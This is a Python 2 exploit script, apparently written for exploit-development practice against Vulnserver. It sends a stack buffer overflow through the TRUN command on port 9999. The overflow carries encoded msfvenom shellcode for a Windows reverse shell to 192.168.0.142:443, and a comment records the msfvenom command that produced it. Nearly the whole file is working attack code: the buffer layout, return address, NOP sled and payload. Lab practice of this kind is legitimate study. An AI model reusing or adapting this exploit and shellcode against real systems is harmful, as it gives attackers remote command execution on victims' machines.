#!/usr/bin/python

'''
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
'''

import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 9999
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()


## msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.142 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"

payload = (
"\xda\xcf\xbd\x7f\x10\x1f\xc1\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x6b\x13\x03\x14\x03\xfd\x34\x16\xcb\x83"
"\xb7\xe6\x0c\xe4\x3e\x03\x3d\x24\x24\x40\x6e\x94\x2e\x04\x83"
"\x5f\x62\xbc\x10\x2d\xab\xb3\x91\x98\x8d\xfa\x22\xb0\xee\x9d"
"\xa0\xcb\x22\x7d\x98\x03\x37\x7c\xdd\x7e\xba\x2c\xb6\xf5\x69"
"\xc0\xb3\x40\xb2\x6b\x8f\x45\xb2\x88\x58\x67\x93\x1f\xd2\x3e"
"\x33\x9e\x37\x4b\x7a\xb8\x54\x76\x34\x33\xae\x0c\xc7\x95\xfe"
"\xed\x64\xd8\xce\x1f\x74\x1d\xe8\xff\x03\x57\x0a\x7d\x14\xac"
"\x70\x59\x91\x36\xd2\x2a\x01\x92\xe2\xff\xd4\x51\xe8\xb4\x93"
"\x3d\xed\x4b\x77\x36\x09\xc7\x76\x98\x9b\x93\x5c\x3c\xc7\x40"
"\xfc\x65\xad\x27\x01\x75\x0e\x97\xa7\xfe\xa3\xcc\xd5\x5d\xac"
"\x21\xd4\x5d\x2c\x2e\x6f\x2e\x1e\xf1\xdb\xb8\x12\x7a\xc2\x3f"
"\x54\x51\xb2\xaf\xab\x5a\xc3\xe6\x6f\x0e\x93\x90\x46\x2f\x78"
"\x60\x66\xfa\x2f\x30\xc8\x55\x90\xe0\xa8\x05\x78\xea\x26\x79"
"\x98\x15\xed\x12\x33\xec\x66\xdd\x6c\xee\xf8\xb5\x6e\xee\x05"
"\xfd\xe6\x08\x6f\x11\xaf\x83\x18\x88\xea\x5f\xb8\x55\x21\x1a"
"\xfa\xde\xc6\xdb\xb5\x16\xa2\xcf\x22\xd7\xf9\xad\xe5\xe8\xd7"
"\xd9\x6a\x7a\xbc\x19\xe4\x67\x6b\x4e\xa1\x56\x62\x1a\x5f\xc0"
"\xdc\x38\xa2\x94\x27\xf8\x79\x65\xa9\x01\x0f\xd1\x8d\x11\xc9"
"\xda\x89\x45\x85\x8c\x47\x33\x63\x67\x26\xed\x3d\xd4\xe0\x79"
"\xbb\x16\x33\xff\xc4\x72\xc5\x1f\x74\x2b\x90\x20\xb9\xbb\x14"
"\x59\xa7\x5b\xda\xb0\x63\x7b\x39\x10\x9e\x14\xe4\xf1\x23\x79"
"\x17\x2c\x67\x84\x94\xc4\x18\x73\x84\xad\x1d\x3f\x02\x5e\x6c"
"\x50\xe7\x60\xc3\x51\x22"
)

buffer = 'A' * 2006 + '\xaf\x11\x50\x62' + "\x90" * 16 + payload

req1 = "TRUN ." + buffer
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()

## Result
## EIP = 396F4338